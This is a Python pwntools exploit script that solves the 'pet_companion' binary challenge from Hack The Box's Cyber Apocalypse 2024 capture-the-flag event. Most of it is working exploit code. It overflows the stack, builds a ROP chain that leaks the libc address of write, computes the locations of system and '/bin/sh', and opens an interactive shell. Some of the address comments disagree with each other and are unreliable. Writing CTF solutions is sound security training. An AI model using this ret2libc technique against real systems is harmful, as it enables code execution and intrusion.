#!/usr/bin/python3

## HTB - Cyber Apocalypse 2024
## pwn: pet_companion

import pwn

#pwn.context.log_level = 'debug'
executable = "./pet_companion"
library = "./glibc/libc.so.6"


#------------- Finding Offset -------------#
elf = pwn.ELF(executable)
io = elf.process()
io.sendline(pwn.cyclic(100, n=8))
io.wait()
core = io.corefile
offset = pwn.cyclic_find(core.read(core.rsp, 8), n=8)
io.close()
#print('OFFSET:', offset)


#--------------- Exploiting ---------------#
elf = pwn.ELF(executable)
io = elf.process()
#io = pwn.remote("10.10.10.10", 1337)

# Building ROP Chain
rop = pwn.ROP(elf)
pop_rdi = rop.rdi.address # 0x0000000000400743
pop_rsi = rop.rsi.address # 0x0000000000400741

# Finding Addresses' Offset from Executable
write_got_address = elf.got['write'] # 0x00600FD8
write_plt_address = elf.plt['write'] # 0x04195568
main_address = elf.symbols['main'] # 0x0000000000400741

# Attack #1
io.recv()
payload1 = b"".join([
    b"A" * offset,
    pwn.p64(pop_rsi),
    pwn.p64(write_got_address),
    pwn.p64(0),
    pwn.p64(write_plt_address),
    pwn.p64(main_address)
])
io.sendline(payload1)

# Finding Addresses' Offset from Library
leaked = io.recvuntil(b'status:').split(b'...\n\n')[1]
libc = pwn.ELF(library)
libc_write_address = pwn.u64(leaked[:8]) # Randomly assigned at runtime
libc_base  = libc_write_address - libc.symbols["write"]
libc_system = libc_base + libc.symbols["system"]
libc_binsh =  libc_base + next(libc.search(b'/bin/sh\x00'))

# Attack #2
payload2 = b"".join([
    b"A" * offset,
    pwn.p64(pop_rdi),
    pwn.p64(libc_binsh),
    pwn.p64(libc_system)
])
io.sendline(payload2)

#------------- Getting a Shell ------------#
io.interactive()
exit()
